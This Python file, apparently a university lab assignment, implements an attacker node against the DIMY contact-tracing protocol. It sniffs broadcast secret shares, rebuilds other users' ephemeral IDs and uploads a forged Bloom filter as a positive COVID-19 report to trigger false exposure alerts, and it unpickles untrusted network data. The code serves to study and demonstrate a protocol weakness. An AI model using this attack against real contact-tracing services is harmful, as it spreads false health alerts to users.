# Code completed by Yuchen Bai(z5526405), Shukun Chen(z5466882) and Mengyu You(z5471795)
# Team 5 (Lab: Wed 4-6pm Tutor: Navodika Karunasingha)
import socket
import hashlib
import random
import sys
import threading
import pickle
import time
import bitarray
import mmh3
import struct  

if len(sys.argv) < 3:
    print("Usage: python3 Attacker.py [Server_IP] [Server_Port]")
    print("Example: python3 Attacker.py 127.0.0.1 55000")
    sys.exit(1)

SERVER_IP = sys.argv[1]
SERVER_PORT = int(sys.argv[2])

# Configuration
MULTICAST_GROUP = '224.0.0.1'  # Multicast address
BROADCAST_PORT = 50000  # Multicast port for node broadcasts
BUFFER_SIZE = 4096
BLOOM_FILTER_SIZE = 102400  # 100KB
HASH_FUNCTIONS = 3  # Number of hash functions for Bloom filter

# Attacker info
ATTACKER_ID = f"Attacker-{random.randint(1000, 9999)}"

print(f"DIMY Attacker Node starting: {ATTACKER_ID}")
print(f"Server: {SERVER_IP}:{SERVER_PORT}")

# Global variables
running = True
collected_shares = {}  # Store shares collected from other nodes
collected_ephids = {}  # Store reconstructed EphIDs

class ShamirSecretSharing:
    @staticmethod
    def _eval_at(poly, x, prime):
        """Evaluate polynomial at x"""
        accum = 0
        for coef in reversed(poly):
            accum *= x
            accum += coef
            accum %= prime
        return accum

    @staticmethod
    def reconstruct_secret(shares, prime=2 ** 521 - 1):
        """
        Reconstruct secret from shares
        """
        if len(shares) < 2:
            raise ValueError("At least 2 shares are needed")

        x_values = []
        for x, _ in shares:
            if x not in x_values:
                x_values.append(x)

        if len(x_values) != len(set(x_values)):
            raise ValueError("x values in shares are duplicated")

        sums = 0
        for i, (x_i, y_i) in enumerate(shares):
            # Convert y_i from bytes to integer 
            if isinstance(y_i, bytes):
                y_i = int.from_bytes(y_i, byteorder='big')  

            numerator = 1
            denominator = 1
            for j, (x_j, _) in enumerate(shares):
                if i == j:
                    continue
                numerator = (numerator * (-x_j)) % prime
                denominator = (denominator * (x_i - x_j)) % prime

            if denominator == 0:
                raise ValueError(f"Denominator is zero: x_i={x_i}, x_j={x_j}")

            inv_denominator = pow(denominator, prime - 2, prime)
            lagrange = (y_i * numerator * inv_denominator) % prime  
            sums = (sums + lagrange) % prime

        # Convert final sum back to bytes
        secret_bytes = sums.to_bytes((sums.bit_length() + 7) // 8, 'big')
        return secret_bytes
    
    # def reconstruct_secret(shares, prime=2**521-1):
    #     """
    #     Reconstruct secret from shares using Lagrange interpolation
    #     """
    #     if len(shares) < 2:
    #         raise ValueError("At least 2 shares needed to reconstruct the secret")
            
    #     sums = 0
        
    #     for i, (x_i, y_i) in enumerate(shares):
    #         numerator = 1
    #         denominator = 1
            
    #         for j, (x_j, _) in enumerate(shares):
    #             if i == j:
    #                 continue
    #             numerator = (numerator * (0 - x_j)) % prime
    #             denominator = (denominator * (x_i - x_j)) % prime
                
    #         lagrange = (y_i * numerator * pow(denominator, prime - 2, prime)) % prime
    #         sums = (sums + lagrange) % prime
            
    #     # Convert integer back to bytes
    #     secret_bytes = sums.to_bytes((sums.bit_length() + 7) // 8, byteorder='big')
    #     return secret_bytes

def listen_for_broadcasts():
    """Listen for multicast broadcasts from other nodes to collect shares"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Allow multiple sockets to bind to the same port
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    
    # Bind to the multicast port
    sock.bind(('', BROADCAST_PORT))
    print(f"[{time.strftime('%H:%M:%S')}] Listening on multicast port {BROADCAST_PORT}")
    
    # Join the multicast group
    group = socket.inet_aton(MULTICAST_GROUP)
    mreq = struct.pack('4sL', group, socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    print(f"[{time.strftime('%H:%M:%S')}] Joined multicast group {MULTICAST_GROUP}")

    while running:
        try:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            message = pickle.loads(data)

            # Process only share messages
            if message.get('type') == 'share':
                handle_share_message(message, addr)

        except Exception as e:
            print(f"[{time.strftime('%H:%M:%S')}] Error receiving broadcast: {e}")

    sock.close()

def handle_share_message(message, addr):
    """Process received share messages"""
    ephid_hash = message.get('ephid_hash')
    share_idx = message.get('share_idx')
    share = message.get('share')
    hash_value = message.get('hash')
    node_id = message.get('node_id')

    print(f"[{time.strftime('%H:%M:%S')}] Received share from {node_id} ({addr[0]})")

    # Store the share
    if ephid_hash not in collected_shares:
        collected_shares[ephid_hash] = {
            'shares': [],
            'hash': hash_value,
            'node_id': node_id,
            'timestamp': time.time()
        }

    # Add share if x value not already present
    new_x = share[0]  
    existing_xs = [s[0] for s in collected_shares[ephid_hash]['shares']]

    if new_x not in existing_xs:
        collected_shares[ephid_hash]['shares'].append(share)
        print(
            f"[{time.strftime('%H:%M:%S')}] Collected {len(collected_shares[ephid_hash]['shares'])} shares for {ephid_hash[:12]}")

        # Try to reconstruct if having enough shares
        if len(collected_shares[ephid_hash]['shares']) >= 3:  # Assuming k=3
            try_reconstruct_ephid(ephid_hash)
    else:
        print(f"[{time.strftime('%H:%M:%S')}] Duplicate x={new_x} detected. Share rejected.")

def try_reconstruct_ephid(ephid_hash):
    """Try to reconstruct EphID from collected shares"""
    if ephid_hash not in collected_shares or 'reconstructed' in collected_shares[ephid_hash]:
        return

    data = collected_shares[ephid_hash]

    try:
        # Attempt to reconstruct secret
        reconstructed_ephid = ShamirSecretSharing.reconstruct_secret(data['shares'])

        # Verify reconstructed EphID
        computed_hash = hashlib.sha256(reconstructed_ephid).hexdigest()

        if computed_hash == ephid_hash:
            print(f"[{time.strftime('%H:%M:%S')}] Successfully reconstructed EphID: {reconstructed_ephid.hex()[:12]}")
            data['reconstructed'] = True
            data['ephid'] = reconstructed_ephid

            # Store in collected EphIDs
            collected_ephids[ephid_hash] = {
                'ephid': reconstructed_ephid,
                'node_id': data['node_id'],
                'timestamp': time.time()
            }
        else:
            print(f"[{time.strftime('%H:%M:%S')}] EphID verification failed")
    except Exception as e:
        print(f"[{time.strftime('%H:%M:%S')}] Error reconstructing EphID: {e}")

def false_positive_report_attack():
    """
    False Positive Report Attack
    Create a fake CBF with collected EphIDs to cause false positive matches
    """
    print(f"[{time.strftime('%H:%M:%S')}] Starting false positive report attack...")
    
    while running:
        # Wait until having some EphIDs
        if not collected_ephids:
            print(f"[{time.strftime('%H:%M:%S')}] Waiting for EphIDs to be collected...")
            time.sleep(10)
            continue

        print(f"[{time.strftime('%H:%M:%S')}] Executing false positive report attack")

        try:
            # Create fake CBF with collected EphIDs
            fake_cbf = bitarray.bitarray(BLOOM_FILTER_SIZE * 8)
            fake_cbf.setall(0)

            # Add all collected EphIDs to the CBF
            for ephid_hash, data in collected_ephids.items():
                ephid_hex = data['ephid'].hex()
                for i in range(HASH_FUNCTIONS):
                    hash_val = mmh3.hash(ephid_hex, i) % (BLOOM_FILTER_SIZE * 8)
                    fake_cbf[hash_val] = 1

            # Connect to the server and report as positive
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))

            # Send fake CBF
            message = {
                'type': 'CBF',
                'node_id': f"FakePositive-{ATTACKER_ID}",
                'cbf': fake_cbf.tobytes()
            }

            data = pickle.dumps(message)
            data_length = len(data).to_bytes(4, byteorder='big')
            sock.sendall(data_length + data)
            
            print(f"[{time.strftime('%H:%M:%S')}] Sent fake positive CBF with {len(collected_ephids)} EphIDs")

            # Get response
            response = sock.recv(BUFFER_SIZE)
            response_data = pickle.loads(response)

            print(f"[{time.strftime('%H:%M:%S')}] Server response: {response_data}")
            sock.close()

            print(f"[{time.strftime('%H:%M:%S')}] Attack successful! Legitimate users who have encountered nodes {list(collected_ephids.keys())} will receive false positive notifications.")
            print(f"[{time.strftime('%H:%M:%S')}] This demonstrates a privacy vulnerability in the DIMY protocol.")

        except Exception as e:
            print(f"[{time.strftime('%H:%M:%S')}] Error in false positive attack: {e}")

        time.sleep(60)

def report_statistics():
    """Report attack statistics periodically"""
    while running:
        print("\n" + "=" * 50)
        print(f"[{time.strftime('%H:%M:%S')}] DIMY Attacker Statistics:")
        print(f"  Unique EphID hashes collected: {len(collected_shares)}")
        print(f"  Successfully reconstructed EphIDs: {len(collected_ephids)}")

        if collected_ephids:
            print("  Reconstructed EphIDs:")
            for ephid_hash, data in list(collected_ephids.items())[:5]:  # Show first 5
                time_ago = time.time() - data['timestamp']
                print(f"    {ephid_hash[:16]}... from {data['node_id']} ({time_ago:.1f}s ago)")

            if len(collected_ephids) > 5:
                print(f"    ... and {len(collected_ephids) - 5} more")

        print("=" * 50 + "\n")
        time.sleep(15)

def main():
    """Main attacker function"""
    print(f"[{time.strftime('%H:%M:%S')}] Starting false positive report attack on DIMY protocol")
    print(f"[{time.strftime('%H:%M:%S')}] This attack will collect EphIDs from legitimate nodes and")
    print(f"[{time.strftime('%H:%M:%S')}] create a false positive COVID-19 report to trigger false alerts")
    
    # Start listening thread
    listener_thread = threading.Thread(target=listen_for_broadcasts)
    listener_thread.daemon = True
    listener_thread.start()

    # Start false positive attack thread
    attack_thread = threading.Thread(target=false_positive_report_attack)
    attack_thread.daemon = True
    attack_thread.start()

    # Start statistics thread
    stats_thread = threading.Thread(target=report_statistics)
    stats_thread.daemon = True
    stats_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down attacker...")
        global running
        running = False

if __name__ == "__main__":
    main()